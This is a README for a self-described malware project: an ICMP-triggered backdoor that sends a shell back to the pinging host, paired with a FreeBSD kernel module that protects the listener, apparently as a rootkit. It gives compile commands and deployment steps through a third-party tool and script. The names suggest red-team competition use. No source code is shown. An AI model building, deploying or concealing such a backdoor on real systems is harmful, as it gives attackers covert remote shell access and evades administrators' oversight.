# dad_son

Malware that listens for ICMP echo requests with a code of 1 and sends back a shell to that IP, and a FreeBSD kernel module that protects that listener/shell giver. This readme will be expanded later on.

## Requirements

libpcap, and the executable that you want to run on ping as /bin/ipfctl. stdin, out, and err are redirected from son to this executable.

## Build
### Dad
To compile dad.ko, simply run `make` on a system with the FreeBSD kernel source tree of your choice in /usr/src. 

### Son
To compile son, run `gcc -o son son.c -lpcap`.

## Steps to Deploy
1. Install Detocord https://github.com/micahjmartin/detcord
2. `detcord DontTalkToMeOrMySonAgain.py deploy_Dad_and_Son deploy_CrowdControlBeacon`
